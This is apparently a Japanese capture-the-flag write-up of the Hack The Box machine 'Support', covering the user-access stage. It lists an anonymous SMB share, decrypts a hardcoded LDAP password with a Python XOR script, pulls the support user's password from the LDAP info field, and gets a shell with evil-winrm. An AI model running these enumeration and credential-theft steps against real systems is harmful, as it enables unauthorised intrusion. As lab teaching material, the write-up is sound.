まずsmbシェアをみると見慣れない`support-tools`なるものがある。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient -L 10.10.11.174 

Password for [WORKGROUP\shoebill]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
  ```
  
 パスワード無しで`support-tools`にアクセスして中身のを確認する。
 
 ```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\shoebill]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 02:01:06 2022
  ..                                  D        0  Sat May 28 20:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 20:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 20:19:55 2022
  putty.exe                           A  1273576  Sat May 28 20:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 20:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 02:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 20:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 20:19:43 2022
```

以下のようにして再帰的にすべてダウンロードする。

```
smb: \> mask ''
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```
得られたファイルのうち`UserInfo.exe.zip`にユーザの情報がありそうなので、これを解凍してdnSpyで解析する。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/support-tools]
└─$ unzip UserInfo.exe.zip
```
`UserInfo.exe`をdnSpyでみると暗号化されたパスワードと、キー、そしてパスワードを生成するような`getPassword()`関数が見つかる。

![dnspy](https://user-images.githubusercontent.com/85237728/194679210-75055544-fd20-497f-bbca-8caedabb954e.png)

XORは二回繰り返すとと元に戻るので、このコードを参考にPythonスクリプトを書く。

```python
#!/usr/bin/env python3
from base64 import b64decode
from pwn import *

array = b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = bytes('armando', 'utf-8')
ans = b''
for i in range(len(array)):
    temp = array[i] ^ key[i % len('armando')] ^ 223
    ans += pack(temp, 'all')

print('ans:', ans)
```
実行すると生のパスワードを得る。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ python3 decryptor.py
ans: b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
しかし、このパスワードはユーザsupportのパスワードではない。

もう少しdnSpyの解析結果をみると、`LdapQuery()`というLdapについての関数が見つかる。

![ldapq](https://user-images.githubusercontent.com/85237728/194679714-8b0abf6c-6c51-40f4-8785-4845d4691776.png)

これにより"ldap"という名前のユーザいることがわかった。

ユーザ名ldap、パスワードnvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmzのcredentialを使って`ldapsearch`コマンドを実行する。

以下のように実行してUser情報をenumすると、ユーザsupportの「info」の欄にパスワードらしき文字列がある。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174/LdapSearch]
└─$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'
...
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
...
```

ユーザ名support、パスワードIronside47pleasure40Watchfulで`evil-winrm`を実行したらユーザsupportのシェルがとれた。

```
┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
└─$ evil-winrm --ip 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```
![usertxt](https://user-images.githubusercontent.com/85237728/194680079-a0d7880f-ce8b-407e-8baf-f57a8367a305.png)

